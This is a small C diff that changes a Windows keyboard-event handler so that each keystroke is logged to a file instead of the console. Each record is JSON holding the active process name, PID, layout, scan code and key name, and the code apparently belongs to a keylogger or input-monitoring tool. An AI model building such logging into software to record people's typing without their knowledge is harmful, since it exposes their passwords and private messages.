@@ -7,12 +7,12 @@
 
 
 
-void process_kbd_event(int vsc, int e0, int e1, int keyup, int vk)
+void process_kbd_event(int vsc, int e0, int e1, int keyup, int vk, HANDLE *hFile)
 {
     klg_ctx_t ctx = get_context();
-
-    fprintf(stdout, "{ \"time\": %d, \"process\": \"%s\", \"pid\": %d, \"klid\": \"%s\", \"hkl\": \"%.8x\", \"keyup\": %d, \"sc\": %d, \"e0\": %d, \"e1\": %d, \"vk\": %d, \"vkn\": \"%s\" }\n",
-    //fprintf(stdout, "{ \"time\": %d, \"klid\": \"%s\", \"keyup\": %d, \"sc\": %d, \"e0\": %d, \"e1\": %d, \"vk\": %d, \"vkn\": \"%s\" }\n",
+    char buf[1024] = {0};
+    sprintf_s(buf, sizeof(buf), "{ \"time\": %d, \"process\": \"%s\", \"pid\": %d, \"klid\": \"%s\", \"hkl\": \"%.8x\", \"keyup\": %d, \"sc\": %d, \"e0\": %d, \"e1\": %d, \"vk\": %d, \"vkn\": \"%s\" }\n",
+        //fprintf(stdout, "{ \"time\": %d, \"klid\": \"%s\", \"keyup\": %d, \"sc\": %d, \"e0\": %d, \"e1\": %d, \"vk\": %d, \"vkn\": \"%s\" }\n",
         ctx.time,
         ctx.procname,
         ctx.pid,
@@ -23,8 +23,9 @@ void process_kbd_event(int vsc, int e0, int e1, int keyup, int vk)
         e0 ? 1 : 0,
         e1 ? 1 : 0,
         vk,
-        VKN(vk)
-    );
+        VKN(vk));
+    DWORD written;
+	WriteFile(*hFile, buf, (DWORD)strlen(buf), &written, NULL);
 
 }
 
